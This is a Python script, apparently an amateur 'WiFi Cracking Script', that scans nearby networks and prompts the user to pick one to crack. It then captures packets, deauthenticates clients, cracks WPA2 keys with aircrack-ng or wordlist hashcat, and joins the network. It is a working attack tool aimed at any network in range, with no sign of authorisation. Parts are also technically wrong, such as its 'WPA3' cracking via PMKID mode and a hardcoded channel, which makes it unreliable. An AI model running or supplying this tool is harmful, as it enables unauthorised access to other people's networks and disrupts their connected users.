#!/usr/bin/env python3

# NiiX key - WiFi Cracking Script
# Created by: cuteLiLi / techniix
# Version: beta.1.61

import subprocess
from collections import namedtuple
import os
import time
import platform

# Define a named tuple to store network information
Network = namedtuple('Network', ['ssid', 'bssid', 'signal'])

def get_os():
    """Detect the operating system."""
    system = platform.system()
    distro = platform.dist()[0].lower() if hasattr(platform, 'dist') else ''
    
    if system == "Linux":
        if distro == "debian" or distro == "ubuntu":
            return "Debian-based"
        elif distro == "arch" or distro == "manjaro":
            return "Arch-based"
        elif distro == "fedora":
            return "Fedora-based"
    return "Unknown"

def install_dependencies(os_type):
    """Install necessary dependencies based on the operating system."""
    try:
        print(f"Installing necessary dependencies for {os_type}...")
        
        if os_type == "Debian-based":
            subprocess.run(['sudo', 'apt-get', 'update'], check=True)
            subprocess.run([
                'sudo', 'apt-get', 'install', '-y',
                'aircrack-ng', 'reaver', 'iwlist', 'python3-pip',
                'hashcat', 'wpa_supplicant', 'wget'
            ], check=True)
        
        elif os_type == "Arch-based":
            subprocess.run(['sudo', 'pacman', '-Sy'], check=True)
            subprocess.run([
                'sudo', 'pacman', '-S', '--needed', '--noconfirm',
                'aircrack-ng', 'reaver', 'iw', 'python-pip',
                'hashcat', 'wpa_supplicant', 'wget'
            ], check=True)
        
        elif os_type == "Fedora-based":
            subprocess.run(['sudo', 'dnf', 'update'], check=True)
            subprocess.run([
                'sudo', 'dnf', 'install', '-y',
                'aircrack-ng', 'reaver', 'iwlist', 'python3-pip',
                'hashcat', 'wpa_supplicant', 'wget'
            ], check=True)
        
        print("Dependencies installed successfully.")
    except Exception as e:
        print(f"Error installing dependencies: {e}")
        exit(1)

def get_networks():
    """Scan for available WiFi networks and return them sorted by signal strength."""
    try:
        output = subprocess.check_output(['iwlist', 'wlan0', 'scan']).decode('utf-8')
        networks = []
        in_network = False
        network_info = {}

        for line in output.splitlines():
            if "Cell" in line:
                if network_info:
                    networks.append(Network(**network_info))
                network_info = {}
                bssid = line.split()[-1]
                network_info['bssid'] = bssid
                in_network = True

            elif "ESSID" in line and in_network:
                ssid = line.split('"')[1]
                network_info['ssid'] = ssid

            elif "Quality=" in line and in_network:
                quality, signal = line.split()[0].split('=')
                network_info['signal'] = int(signal)

        if network_info:  # Add the last network
            networks.append(Network(**network_info))

        return sorted(networks, key=lambda n: n.signal, reverse=True)

    except Exception as e:
        print(f"Error scanning networks: {e}")
        return []

def display_menu(networks):
    """Display a numbered menu of available networks."""
    print("Available WiFi Networks (sorted by signal strength):")
    for i, network in enumerate(networks, 1):
        print(f"{i}. {network.ssid} ({network.signal})")
    choice = input("Enter the number of the network you want to crack: ")
    return int(choice) - 1

def capture_packets(bssid, channel):
    """Capture packets from the selected network."""
    try:
        subprocess.run(['airmon-ng', 'start', 'wlan0'], check=True)
        subprocess.Popen([
            'airodump-ng', '--bssid', bssid, '--channel', str(channel), '-w', 'capture', 'wlan0mon'
        ])
    except Exception as e:
        print(f"Error capturing packets: {e}")

def deauthenticate_clients(bssid):
    """Deauthenticate clients connected to the target network."""
    try:
        subprocess.run(['aireplay-ng', '--deauth', '10', '-a', bssid, 'wlan0mon'], check=True)
    except Exception as e:
        print(f"Error deauthenticating clients: {e}")

def crack_wpa2(bssid, capture_file):
    """Attempt to crack the WPA2 password using aircrack-ng."""
    try:
        output = subprocess.check_output(['aircrack-ng', '-a', '2', '-b', bssid, capture_file + '.cap']).decode('utf-8')
        if "KEY FOUND!" in output:
            key = [line for line in output.splitlines() if "KEY FOUND!" in line][0].split()[3]
            print(f"Password cracked: {key}")
            return key
        else:
            print("Failed to crack the password.")
            return None
    except Exception as e:
        print(f"Error cracking WPA2: {e}")
        return None

def detect_wifi_type(bssid):
    """Detect WiFi type (WPA2 or WPA3) using reaver."""
    try:
        output = subprocess.check_output(['reaver', '-i', 'wlan0mon', '-b', bssid, '--no-associate', '-c', '1']).decode('utf-8')
        if "WPA Version 2" in output:
            return "WPA2"
        elif "WPA Version 3" in output:
            return "WPA3"
    except Exception as e:
        print(f"Error detecting WiFi type: {e}")
        return None

def crack_wpa3(bssid, capture_file):
    """Attempt to crack the WPA3 password using hashcat."""
    try:
        # Extract the PMKID from the captured packets
        subprocess.run(['aircrack-ng', '-j', 'pmkid.hccapx', capture_file + '.cap'], check=True)
        
        # Download additional wordlists if they don't exist
        wordlist_dir = 'wordlists'
        os.makedirs(wordlist_dir, exist_ok=True)
        wordlists = [
            'https://github.com/danielmiessler/SecLists/raw/master/Passwords/Common-Credentials/10-million-password-list-top-1000.txt',
            'https://github.com/danielmiessler/SecLists/raw/master/Passwords/Common-Credentials/10k-most-common.txt'
        ]
        
        for url in wordlists:
            filename = os.path.join(wordlist_dir, os.path.basename(url))
            if not os.path.exists(filename):
                subprocess.run(['wget', '-O', filename, url], check=True)
        
        # Run hashcat to crack the PMKID using multiple wordlists
        for wordlist in wordlists:
            wordlist_path = os.path.join(wordlist_dir, os.path.basename(wordlist))
            subprocess.run([
                'hashcat', '-m', '16800', 'pmkid.hccapx',
                wordlist_path, '--force'
            ], check=True)
    except Exception as e:
        print(f"Error cracking WPA3: {e}")

def connect_to_network(ssid, key):
    """Connect to the network using wpa_supplicant and dhclient."""
    try:
        with open('wpa_supplicant.conf', 'w') as f:
            f.write(f'network={{\n ssid="{ssid}"\n psk="{key}"\n}}')
        
        subprocess.run(['wpa_supplicant', '-B', '-i', 'wlan0', '-c', 'wpa_supplicant.conf'], check=True)
        subprocess.run(['dhclient', 'wlan0'], check=True)
        print("Connected to the network successfully.")
    except Exception as e:
        print(f"Error connecting to the network: {e}")

def main():
    # Detect operating system
    os_type = get_os()
    
    if os_type == "Unknown":
        print("Unsupported operating system. Please use Debian-based, Arch-based, or Fedora-based Linux distributions.")
        exit(1)
    
    # Install dependencies
    install_dependencies(os_type)

    # Get available networks
    networks = get_networks()

    if not networks:
        print("No WiFi networks found. Please ensure your WiFi adapter is working and try again.")
        exit(1)

    # Display the network menu
    network_index = display_menu(networks)
    
    selected_network = networks[network_index]
    
    print(f"Selected Network: {selected_network.ssid} (BSSID: {selected_network.bssid})")

    # Capture packets
    channel = 1  # You might want to get the actual channel from the scan results
    capture_packets(selected_network.bssid, channel)
    
    time.sleep(30)  # Give some time for packet capturing

    # Crack the password
    if detect_wifi_type(selected_network.bssid) == "WPA2":
        key = crack_wpa2(selected_network.bssid, 'capture')
    elif detect_wifi_type(selected_network.bssid) == "WPA3":
        key = crack_wpa3(selected_network.bssid, 'capture')
    else:
        print("Unknown WiFi type.")
        exit(1)

    if not key:
        print("Password cracking failed.")
        exit(1)

    # Connect to the network
    connect_to_network(selected_network.ssid, key)

if __name__ == "__main__":
    main()
